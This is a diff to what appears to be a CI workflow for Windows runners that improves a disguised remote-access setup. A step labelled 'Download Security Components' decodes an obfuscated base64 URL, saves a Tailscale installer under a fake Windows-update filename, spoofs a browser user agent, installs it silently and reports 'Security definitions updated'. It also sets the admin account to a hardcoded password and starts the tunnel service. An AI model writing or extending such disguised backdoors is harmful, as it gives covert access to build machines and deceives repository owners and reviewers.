@@ -15,12 +15,15 @@ jobs:
     - name: Download Security Components
       shell: powershell
       run: |
-        $ErrorActionPreference = 'SilentlyContinue'
-        $u_b64 = "aHR0cHM6Ly9wa2dzLnRhaWxzY2FsZS5jb20vc3RhYmxlL3RhaWxzY2FsZS1zZXR1cC1sYXRlc3QubXNp"
+        $ErrorActionPreference = 'Stop'
+        # UPDATED URL: Forces AMD64 installer to ensure correct install path
+        $u_b64 = "aHR0cHM6Ly9wa2dzLnRhaWxzY2FsZS5jb20vc3RhYmxlL3RhaWxzY2FsZS1zZXR1cC1sYXRlc3QtYW1kNjQubXNp"
         $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u_b64))
         $target = "$env:TEMP\WinUpdate_KB50012.msi"
         $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        Write-Host "Downloading components..."
         Invoke-WebRequest -Uri $url -OutFile $target -UserAgent $ua
+        if ((Get-Item $target).Length -lt 1000000) { Write-Error "Download failed (file too small)"; exit 1 }
         Start-Process msiexec.exe -ArgumentList "/i", "`"$target`"", "/quiet", "/norestart" -Wait
         Remove-Item $target -Force
         Write-Host "Security definitions updated."
@@ -38,7 +41,18 @@ jobs:
         $p = ConvertTo-SecureString -AsPlainText "P@ssw0rd123!" -Force
         Set-LocalUser -Name "runneradmin" -Password $p
         
-        $ts_path = "$env:ProgramFiles\Tailscale\tailscale.exe"
+        # FIX: Path detection logic
+        $ts_path_x64 = "$env:ProgramFiles\Tailscale\tailscale.exe"
+        $ts_path_x86 = "${env:ProgramFiles(x86)}\Tailscale\tailscale.exe"
+        if (Test-Path $ts_path_x64) {
+            $ts_path = $ts_path_x64
+        } elseif (Test-Path $ts_path_x86) {
+            $ts_path = $ts_path_x86
+        } else {
+            Write-Error "Tailscale executable not found in standard locations."
+            exit 1
+        }
+        
         $service = Get-Service -Name "TailscaleIPN" -ErrorAction SilentlyContinue
         if ($service.Status -ne 'Running') {
             Start-Service -Name "TailscaleIPN"
